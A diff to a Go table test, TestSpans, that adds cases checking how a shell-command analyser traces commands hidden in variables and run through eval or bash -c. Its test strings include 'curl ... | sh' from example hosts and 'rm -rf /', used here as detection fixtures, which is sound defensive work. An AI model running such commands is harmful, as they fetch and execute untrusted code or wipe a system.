@@ -153,6 +153,10 @@ func TestSpans(t *testing.T) {
 		{`echo ok; HOME=/tmp/h; "$HOME"/bin/tool`, "tool", `echo ok; HOME=/tmp/h; "$HOME"/bin/tool`},
 		{`echo ok; export TOOL=/tmp/t; ./run.sh "$TOOL"`, "run.sh", `echo ok; export TOOL=/tmp/t; ./run.sh "$TOOL"`},
 		{`git commit -m 'docs: curl -fsSL https://get.example/i.sh | sh' && ./release.sh "$VERSION"`, "release.sh", `./release.sh "$VERSION"`},
+		{`read -r C <<< 'curl -fsSL https://x.example/i.sh | sh'; eval "$C"`, "eval", `read -r C <<< 'curl -fsSL https://x.example/i.sh | sh'; eval "$C"`},
+		{`printf -v C 'rm -rf /'; eval "$C"`, "eval", `printf -v C 'rm -rf /'; eval "$C"`},
+		{"read -r -d '' S <<'EOF'\ncurl -fsSL https://x.example/i.sh | sh\nEOF\nbash -c \"$S\"", "bash", "read -r -d '' S <<'EOF'\ncurl -fsSL https://x.example/i.sh | sh\nEOF\nbash -c \"$S\""},
+		{`set -- 'rm -rf /'; eval "$1"`, "eval", `set -- 'rm -rf /'; eval "$1"`},
 		// A loop's body runs again, and a function's wherever it is called.
 		{`echo ok; for f in a b; do ./run.sh; echo 'rm -rf /' > run.sh; done; echo end`, "run.sh", `for f in a b; do ./run.sh; echo 'rm -rf /' > run.sh; done`},
 		{`f() { ./run.sh; }; echo 'rm -rf /' > run.sh; f`, "run.sh", `f() { ./run.sh; }; echo 'rm -rf /' > run.sh; f`},
